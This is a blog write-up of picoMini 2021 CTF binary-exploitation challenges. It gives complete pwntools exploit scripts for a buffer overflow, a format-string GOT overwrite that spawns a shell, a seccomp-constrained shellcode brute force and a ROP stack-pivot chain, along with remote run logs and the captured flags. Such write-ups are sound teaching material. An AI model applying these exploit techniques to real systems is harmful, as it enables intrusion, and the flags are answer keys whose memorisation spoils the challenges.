+++
title = "picoMini by redpwn"
date = 2021-05-09

[taxonomies]
tags = ["ctf-writeups"]
+++


I competed in picoCTF's 2021 mini-competition with the Texas A&M Cybersecurity Club as [ret2rev](https://ctftime.org/team/154567) and we placed in sixth place. I worked on the binary exploitation challenges and solved five of the six total. Fun challenges, glad I competed. Writeups are below. 

<!-- more -->

# clutter-overflow


```text
Clutter, clutter everywhere and not a byte to use.

nc mars.picoctf.net 31890
```

We're provided [source](picomini-by-redpwn/clutter-overflow/chall.c) and a [binary](picomini-by-redpwn/clutter-overflow/chall). Source isn't super useful here because it's trivially reversible. 

```c
undefined8 main(void)

{
  char local_118 [264];
  long local_10;
  
  local_10 = 0;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts(HEADER);
  puts("My room is so cluttered...");
  puts("What do you see?");
  gets(local_118);
  if (local_10 == 0xdeadbeef) {
    printf("code == 0x%llx: how did that happen??\n",0xdeadbeef);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  }
  else {
    printf("code == 0x%llx\n",local_10);
    printf("code != 0x%llx :(\n",0xdeadbeef);
  }
  return 0;
}
```

Nothing super interesting here; fill up the char buffer, write another 8 bytes of padding, and then write 0xdeadbeef over local_10. It'll compare local_10 and then print the flag. 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("chall")

context.binary = exe

def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31890)
    elif args.DEBUG:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()

    payload = b"A"* 0x100
    payload += b"BBBBBBBB"
    payload += p32(0xdeadbeef)

    r.sendline(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/clutter-overflow/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mars.picoctf.net on port 31890: Done
[*] Switching to interactive mode
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
```

# fermat-strings

```text
Fermat's last theorem solver as a service.

nc mars.picoctf.net 31929
```

We're provided [source](picomini-by-redpwn/fermat-strings/chall.c), a [binary](picomini-by-redpwn/fermat-strings/chall), and the executing [Dockerfile](picomini-by-redpwn/fermat-strings/Dockerfile). 

## setup

It isn't super likely I have the same libc version as the remote and making changes when I run on remote vs local is kinda a pain. The solution is to use grab libc from the provided dockerfile, use [pwninit](https://github.com/io12/pwninit) to grab a compatible ld, and then use [patchelf](https://github.com/NixOS/patchelf) to rewrite the interpreter and rpath so the binary uses the libc in the working directory. 

```bash
pwninit --bin chall
patchelf --set-interpreter ld-2.31.so chall
patchelf --set-rpath . chall
```
This technique is super handy to make your local environment as close as possible to the remote. In one of the later challenges, I grab six or so libraries out of the container to ensure some finicky offsets remain the same. 

## where's the vulnerability?

Name kinda sounds like a format string vuln. We're provided source, so let's take a look!

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

#define SIZE 0x100

int main(void)
{
  char A[SIZE];
  char B[SIZE];

  int a = 0;
  int b = 0;

  puts("Welcome to Fermat\\'s Last Theorem as a service");

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf("A: ");
  read(0, A, SIZE);
  printf("B: ");
  read(0, B, SIZE);

  A[strcspn(A, "\n")] = 0;
  B[strcspn(B, "\n")] = 0;

  a = atoi(A);
  b = atoi(B);

  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }

  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);

  int answer = -1;
  for(int i = 0; i < 100; i++) {
    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
      answer = i;
    }
  }

  if(answer != -1) printf("Found the answer: %d\n", answer);
}
```

Ah, yes, it's a format string vuln.

```c
...
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);
...
```

Any input we provide is ran through atoi first, but all that means is we have to prefix our payload with a number because atoi will discard non digit characters from the end. 

## exploitation

I did a three step exploit. 

1. rewrite pow GOT to point to main so we can repeat the vulnerability multiple times
2. leak libc base from \_\_libc_start_main
3. rewrite strcspn GOT to system

strcspn is called with both A and B (both of our number). Once we've rewritten the GOT to point to system, we can just pass /bin/sh as a number and it'll give us a shell. 


```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/ld-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mars.picoctf.net on port 31929: Done
[*] main address: 0x400837
[*] pow GOT address: 0x601040
[*] strcspn GOT address: 0x601048
/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Calculating for A: ")
[*] rewrote pow GOT to main
/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:58: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline("1")
/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:59: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Calculating for A: 1")
/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:60: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  libc_start_main = int(r.recvuntil(" "),16)
[*] leaked __libc_start_main: 0x7fbcecea00b3
[*] leaked libc_base: 0x7fbcece79000
[*] leaked libc_system: 0x7fbcecece410
[*] Switching to interactive mode
and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: B: Calculating for A: 11111111H\x10 and B: 1                                                                                                                                                                                                                                   400bd8                                                                                                                                                                                                            96c4941e      d8
Welcome to Fermat\'s Last Theorem as a service
A: B: $ cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
Error: could not parse numbers!
Welcome to Fermat\'s Last Theorem as a service
A: $  
```

```python
#!/usr/bin/env python3

from pwn import *
from z3 import *
import time
import re
exe = ELF("chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = "kitty"

offset___libc_start_main_ret = 0x270b3
offset_system = 0x0000000000055410


def overflow(a,b):
    x = Int('x')

    solver = Solver()
    solver.add((x + a) % 0xff == b, x > 0)
    solver.check()
    return solver.model()[x].as_long()

def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31929)
    elif args.GDB:
        return gdb.debug(exe.path, gdbscript="c")
    else:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})


def main():
    r = conn()

    log.info("main address: " + hex(exe.symbols['main']))
    log.info("pow GOT address: " + hex(exe.got['pow']))
    log.info("strcspn GOT address: " + hex(exe.got['strcspn']))

    payload = b"11111111"
    payload += p64(exe.got['pow'])
    payload += p64(exe.got['pow']+1)
    r.sendline(payload)
    payload = b"1"
    payload += f"%{(exe.symbols['main'] & 0xff) - 0x27}x".encode()
    payload += b"%11$hhn"
    payload += f"%{(overflow(0x37, (exe.symbols['main'] >> 8) & 0xff)) + 1}x".encode()
    payload += b"%12$hhn"
    r.sendline(payload)
    r.recvuntil("Calculating for A: ")
    log.info("rewrote pow GOT to main")

    payload = b"1"
    payload += b"%213$lx"
    r.sendline(payload)
    r.sendline("1")
    r.recvuntil("Calculating for A: 1")
    libc_start_main = int(r.recvuntil(" "),16)
    log.info(f"leaked __libc_start_main: {hex(libc_start_main)}")
    libc_base = libc_start_main - offset___libc_start_main_ret
    log.info(f"leaked libc_base: {hex(libc_base)}")

    libc_system = libc_base + offset_system
    log.info(f"leaked libc_system: {hex(libc_system)}")

    payload = b"11111111"
    payload += p64(exe.got['strcspn'])
    payload += p64(exe.got['strcspn']+1)
    payload += p64(exe.got['strcspn']+2)
    r.sendline(payload)

    payload = b"1"
    payload += f"%{overflow((0x2b), libc_system & 0xff) + 5}x".encode()
    payload += b"%11$hhn"
    write_val = overflow((0x10), (libc_system >> 8) & 0xff)
    payload += f"%{write_val}x".encode()
    payload += b"%12$hhn"
    payload += f"%1${overflow(write_val, (libc_system >> 16) & 0xff) - 0x10}hhx".encode()
    payload += b"%13$hhn"
    r.sendline(payload)

    r.sendline(b"/bin/sh".ljust(0x100,b'\x00'))
    r.sendline(b"hi")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

Honestly not a great solution -- it's a little finicky and usually takes multiple executions to work but it got me the flag so I didn't care to fix it. 

## saas


```text
Shellcode as a Service runs any assembly code you give it! For extra safety, you're not allowed to do a lot...

nc mars.picoctf.net 31021
```

Again, we're provided [source](picomini-by-redpwn/saas/chall.c), [binary](picomini-by-redpwn/saas/chall), and [Dockerfile](picomini-by-redpwn/saas/Dockerfile). 

```text
❯ checksec chall
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SIZE 0x100

// http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&arch=x86-64&as_format=inline#assembly
#define HEADER "\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"

#define FLAG_SIZE 64

char flag[FLAG_SIZE];

void load_flag() {
  int fd;
  if ((fd = open("flag.txt", O_RDONLY)) == -1)
    error(EXIT_FAILURE, errno, "open flag");
  if (read(fd, flag, FLAG_SIZE) == -1)
    error(EXIT_FAILURE, errno, "read flag");
  if (close(fd) == -1)
    error(EXIT_FAILURE, errno, "close flag");
}

void setup() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_KILL);
  int ret = 0;
  if (ctx != NULL) {
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
      SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    ret |= seccomp_load(ctx);
  }
  seccomp_release(ctx);
  if (ctx == NULL || ret)
    error(EXIT_FAILURE, 0, "seccomp");
}

int main()
{
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  load_flag();
  puts("Welcome to Shellcode as a Service!");

  void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
  memcpy(addr, HEADER, sizeof(HEADER));
  read(0, addr + sizeof(HEADER) - 1, SIZE);

  setup();
  goto *addr;
}
```

It'll read 0x100 bytes into executable memory and then execute it with the flag in memory. The catch? We're operating under seccomp (can do nothing besides write to stdout and exit) and the header resets every register except RIP. Additionally, we're executing in mmapped memory so we can't correlate the instruction pointer to the program base. So, what do we do?

## "I would simply brute force it" - me

We don't have a lot of information to work with -- in fact, almost nothing. What we *do* have is a write syscall and the fact that segmentation faults in a syscall won't propagate to the parent program. If we check address via a shellcode brute forcer thats an address every like 8 cpu instructions. That's looking quite tractable. 

I wrote a quick python script to get reasonable lower bounds on program base (aka run it 1000 times and see my min/max look like) and then got to writing shellcode. 

```python
import os
from tqdm.contrib.concurrent import process_map

def get_base(a):
	base = os.popen("""gdb chall --batch --nx --ex "set disable-randomization off" --ex "b main" --ex "r" --ex "info proc map" | grep "0x0 /home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall" | tr -s ' ' | cut -d' ' -f2 """).read()
	return int(base,16)

if __name__ == '__main__':
   bases = process_map(get_base, range(0, 1000), max_workers=20)
   print("[*] min base: " + hex(min(bases)))
   print("[*] max base: " + hex(max(bases)))
```

```nasm
mov r10, 0x555572800000
add r10, 0x202060
/* jump here */
add r10, 1048576

mov rax, 1
mov rdi, 1
mov rsi, r10
mov rdx, 100
syscall
cmp rax, 0
jle $-0x25
mov rax, 60
mov rdi, 0
syscall
```
The logic looks like this

1. prep base address
2. try and write to stdout
3. if it errors (EFAULT is -14, so less than 0) increment by 2^20 (unrandomized segment of the address) and try again
4. otherwise, exit

Time varies a little bit, but on my machine I get the flag in about a second. 

```text
❯ python solve.py
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall': pid 50338
[+] Receiving all data: Done (135B)
[*] Process '/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall' stopped with exit code 0 (pid 50338)
picoCTF{placeholder}
```

I rerun the solver on remote... and find that it times out. What gives? Well, as it turns out the docker container enforces some rather strict CPU usage limits and also their server is probably under higher load than my desktop. Armed with the knowledge that *theoretically* this should work and all I needed to do was get lucky and have the program base be in the range I can check in 30 seconds I decided to do the only reasonable thing!  Run it in a loop until it prints a flag and then get lunch. 

30 minutes later the flag is mine! (or more like 3 minutes, I got lucky when i was rerunning it for the writeup lol)

```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mars.picoctf.net on port 31021: Done
[+] Receiving all data: Done (35B)
[*] Closed connection to mars.picoctf.net port 31021
[+] Opening connection to mars.picoctf.net on port 31021: Done
[+] Receiving all data: Done (35B)
[*] Closed connection to mars.picoctf.net port 31021
[+] Opening connection to mars.picoctf.net on port 31021: Done
[+] Receiving all data: Done (35B)
[*] Closed connection to mars.picoctf.net port 31021
[+] Opening connection to mars.picoctf.net on port 31021: Done
[+] Receiving all data: Done (35B)
[*] Closed connection to mars.picoctf.net port 31021
[+] Opening connection to mars.picoctf.net on port 31021: Done
[+] Receiving all data: Done (135B)
[*] Closed connection to mars.picoctf.net port 31021
picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}
```

# lockdown-horses

```text
Here at Moar Horse Industries, we believe, especially during these troubling times, that everyone should be able to make a horse say whatever they want.

We were tired of people getting shells everywhere, so now it should be impossible! Can you still find a way to rope yourself out of this one?

Flag is in the current directory. seccomp-tools might be helpful.

nc mars.picoctf.net 31809
```

We're provided a [binary](picomini-by-redpwn/lockdown-horses/horse) and a [Dockerfile](picomini-by-redpwn/lockdown-horses/Dockerfile) . 

## analysis

First order of business is to do what the prompt says and check out the seccomp restrictions. 

```text
❯ seccomp-tools dump ./horse
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x13 0xc000003e  if (A != ARCH_X86_64) goto 0021
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x10 0xffffffff  if (A != 0xffffffff) goto 0021
 0005: 0x15 0x0e 0x00 0x00000002  if (A == open) goto 0020
 0006: 0x15 0x0d 0x00 0x00000009  if (A == mmap) goto 0020
 0007: 0x15 0x0c 0x00 0x0000003c  if (A == exit) goto 0020
 0008: 0x15 0x0b 0x00 0x000000d9  if (A == getdents64) goto 0020
 0009: 0x15 0x0a 0x00 0x000000e7  if (A == exit_group) goto 0020
 0010: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0015
 0011: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0012: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0021
 0013: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0014: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0020 else goto 0021
 0015: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0021
 0016: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
 0017: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0021
 0018: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0019: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0021
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0021: 0x06 0x00 0x00 0x00000000  return KILL
 ```
Not a lot to work with; mmap, open, getdents, read from stdin, and write to stdout. Looks like we aren't getting a shell here. 

```text
❯ checksec horse
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/lockdown-horses/horse'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
```

Mitigations look wide open, at least.  Let's see what we have to work with vulnerability wise. 

## vulnerability

```c
undefined8 main(void)

{
  undefined local_28 [32];
  
  setup();
  read(0,local_28,0x80);
  horse(local_28);
  return 0;
}
```

oh ok kinda trivial vulnerability. We get 96 bytes of overflow, which accounting for the stored RBP gives us 11 pointers worth of ROP chain. 

## exploitation

So to sum it up, we can ROP 11 times, we have like 5 file i/o syscalls, and the flag has an unknown filename. Our solution is gonna look like this, roughly:

1. use getdents64 to leak filename
2. mmap the flag
3. write the flag to stdout. 

The issue is we're somewhat starved for gadgets (can control rdi and rsi, don't have rdx onwards) and so argument control is kinda hard. There are things we could do to get around this potentially -- I found that calling strlen copied rdi to rdx, letting me get a very large rdx value at least. But even with that, we are still heavily limited in what we can do with only 11 returns. The saving grace is this lovely gadget "pop rsp; pop r13; pop r14; pop r15; ret;". Instead of trying to manage the full exploit in 11 returns, we can just write as long a chain as we want to writable program memory and then pivot the stack onto it. At that point, we can just ROP as usual. Leak the base of libc, mmap some rwx memory, write shellcode, leak the filename with getdents64, and then mmap and write. 

```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/lockdown-horses/horse'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
[+] Opening connection to mars.picoctf.net on port 31809: Done
128
/home/sky/Dropbox/ctf/picomini-by-redpwn/lockdown-horses/solve.py:36: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("/     /   ")
[*] leaked libc_base: 0x7f3c2deff000
[*] leaked flag filename: flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt
[*] Switching to interactive mode
picoCTF{n0_sh3ll_v3ry_flag_xdd}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$  
```

```python
#!/usr/bin/env python3

from pwn import *
import time
import re
exe = ELF("horse")

context.binary = exe
context.terminal = "kitty"

pop_rdi = 0x0000000000400c03
pop_rsi_r15 = 0x0000000000400c01
pop_rsp_r13_r14_r15 = 0x0000000000400bfd

offset_read = 0x0000000000111130
offset_mmap = 0x000000000011ba20

def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31809)
    elif args.GDB:
        return gdb.debug([exe.path],gdbscript="b *main+58\nc\nni 3\nfin\nni 5\nfin\nni 10\nfin\nni 5\nfin\nni 20\nfin\nni 3\nfin\nni 5")
    else:
        return process([exe.path])


def main():
    r = conn()


    # call strlen to get big number in rdx (i didn't bother to look at the source i just know it works lol)
    # read a second, larger ROP chain into writable program memory
    # pivot onto that program memory
    payload = b"A" * 40
    payload += p64(pop_rdi)  + p64(0x400ce0) + p64(exe.symbols['strlen'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(0x602000) + p64(0)
    payload += p64(exe.symbols['read'])
    payload += p64(pop_rsp_r13_r14_r15) + p64(0x602000)
    r.send(payload)
    r.recvuntil("/     /   ")
    r.recvline()


    # leak libc base by writing GOT
    # call read again so we can write another ROP chain with libc gadgets
    # pivot stack onto our new chain


    payload = b"A" * 24 # need padding bc our stack pivot gadget has three pops between pop rsp and ret
    payload += p64(pop_rdi) + p64(1)
    payload += p64(pop_rsi_r15) + p64(exe.got["read"]) + p64(0)
    payload += p64(exe.symbols['write'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(0x6020c0) + p64(0)
    payload += p64(exe.symbols['read'])
    payload += p64(pop_rsp_r13_r14_r15) + p64(0x6020c0)
    payload += p64(0)
    r.sendline(payload)
    read_address = u64(r.recv(8))
    libc_base = read_address - offset_read
    log.info("leaked libc_base: " + hex(libc_base))


    # libc lets us control rdx and rcx, so that gets us the first four args
    # let's take advantage of our new argument control to mmap some executable memory
    # we're not mapping a file so we don't really care much about the last two argument regs


    pop_rdx_r12 = libc_base + 0x000000000011c371
    pop_rcx = libc_base + 0x000000000009f822

    payload = b"A" * 24 # need padding bc our stack pivot gadget has three pops between pop rsp and ret
    payload += p64(pop_rdi) + p64(0x10000)
    payload += p64(pop_rsi_r15) + p64(0x100000) + p64(0)
    payload += p64(pop_rdx_r12) + p64(7) + p64(0) # PROT_READ | PROT_WRITE | PROT_EXEC
    payload += p64(pop_rcx) + p64(0x22) # MAP_PRIVATE | MAP_ANONYMOUS
    payload += p64(libc_base + 0x00000000000c9ccf) # xor r9d, r9d
    payload += p64(libc_base + offset_mmap)

    # we now have rwx memorable at a predictable address
    # lets read some shellcode onto it and then return

    payload += p64(pop_rdi)  + p64(0x400ce0) + p64(exe.symbols['strlen'])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(0x0000000000010000) + p64(0)
    payload += p64(exe.symbols['read'])
    payload += p64(0x10000)
    r.send(payload)

    r.recv(0x10000) # clean stdout


    # get files in directory
    # don't really need to bother parsing it
    # can just print the whole thing and regex the filename out
    # lastly, read again so we can write shellcode with the filename

    payload = b""
    payload += asm(shellcraft.open("/app/"))
    payload += asm(shellcraft.amd64.linux.getdents64(3, 0x100000, 0x1000))
    payload += asm(shellcraft.amd64.linux.write(1, 0x100000, 0x1000))
    payload += asm(shellcraft.amd64.linux.read(0, 0x10000+0x1000, 0x1000))
    payload = payload.ljust(0x1000, b"\x90")
    r.send(payload)

    flag_filename = re.search(b"(flag.*txt)", r.recv(0x1000)).group(0)

    log.info("leaked flag filename: " + flag_filename.decode())

    # lastly, just open/mmap/write the flag filename

    payload = b""
    payload += asm(shellcraft.open(f"/app/{flag_filename.decode()}"))
    payload += asm(shellcraft.amd64.linux.mmap(0x20000,0x100, 1, 2, 4, 0))
    payload += asm(shellcraft.amd64.linux.write(1, "rax", 0x100))
    
    r.send(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

# vr-school

```text
Join my online school! Don't get lost in the virtual functions..

nc mars.picoctf.net 31638
```

I gotta say, big fan of getting Dockerfiles provided. It's quite nice to not need to worry if your exploit will run on remote because your testing environment is identical. 

[chall](picomini-by-redpwn/vr-school/chall) 
[chall](picomini-by-redpwn/vr-school/Dockerfile) 
[chall.patch](picomini-by-redpwn/vr-school/chall.patch) (not provided, has stubbed alarm) 

## analysis


```text
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

```text
❯ ./chall
                                                   /$$$$$$       /$$$$$$ 
                                                   /$$__  $$     /$$$_  $$
 /$$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$/$$$$       |__/  \ $$    | $$$$\ $$
|____ /$$/ /$$__  $$ /$$__  $$| $$_  $$_  $$        /$$$$$$/    | $$ $$ $$
   /$$$$/ | $$  \ $$| $$  \ $$| $$ \ $$ \ $$       /$$____/     | $$\ $$$$
  /$$__/  | $$  | $$| $$  | $$| $$ | $$ | $$      | $$          | $$ \ $$$
 /$$$$$$$$|  $$$$$$/|  $$$$$$/| $$ | $$ | $$      | $$$$$$$$ /$$|  $$$$$$/
|________/ \______/  \______/ |__/ |__/ |__/      |________/|__/ \______/ 

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
0. Create a student
1. Set student name
2. Print student name
3. "Study"
4. Remote student
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
choice: 
```

Menu driven heap pwnable? (yes)

```c
void main(void)

{
  student *psVar1;
  basic_ostream *pbVar2;
  basic_istream<char,std::char_traits<char>> *this;
  student *ppsVar3;
  student *puVar3;
  long in_FS_OFFSET;
  uint menu_select;
  int is_virtual?;
  ulong student_index;
  undefined8 local_20;
  
  local_20 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  seccomp_setup();
